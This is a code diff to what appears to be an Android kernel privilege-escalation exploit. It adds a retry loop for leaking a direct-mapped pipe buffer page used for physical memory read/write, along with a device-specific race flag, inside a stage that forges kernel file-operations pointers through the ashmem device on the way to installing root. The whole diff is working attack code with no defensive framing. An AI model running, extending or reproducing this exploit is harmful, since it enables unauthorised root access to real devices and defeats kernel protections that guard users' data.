@@ -340,6 +340,10 @@ int install_child_root(int fd) {
 
 int try_cfi_stage(void) {
   cfi_attempts++;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+  /* Use the S928 post-write boundary before the first fake-fops open. */
+  pr_info("stage=verifying-kernel-access\n");
+#endif
   int fd = open_ashmem_device();
   int dirty = 0;
   int can_read_back = 0;
@@ -349,7 +353,6 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     return 0;
   }
-
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
@@ -494,9 +497,24 @@ int try_cfi_stage(void) {
 #endif
 
 #if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe after verified fops page=%016zx\n",
-          pipebuf_page_base);
+#ifndef PIPE_FIRST_LEAK_ATTEMPTS
+#define PIPE_FIRST_LEAK_ATTEMPTS 12
+#endif
+  for (int first_leak_attempt = 0;
+       first_leak_attempt < PIPE_FIRST_LEAK_ATTEMPTS;
+       first_leak_attempt++) {
+    if (first_leak_attempt != 0) {
+      reset_pipe_attempt();
+    }
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("fresh physrw pipe after verified fops page=%016zx "
+            "attempt=%d/%d\n",
+            pipebuf_page_base, first_leak_attempt + 1,
+            PIPE_FIRST_LEAK_ATTEMPTS);
+    if (is_direct_ptr(pipebuf_page_base)) {
+      break;
+    }
+  }
   if (!is_direct_ptr(pipebuf_page_base)) {
     cfi_last_step = 8;
     cfi_last_errno = errno;
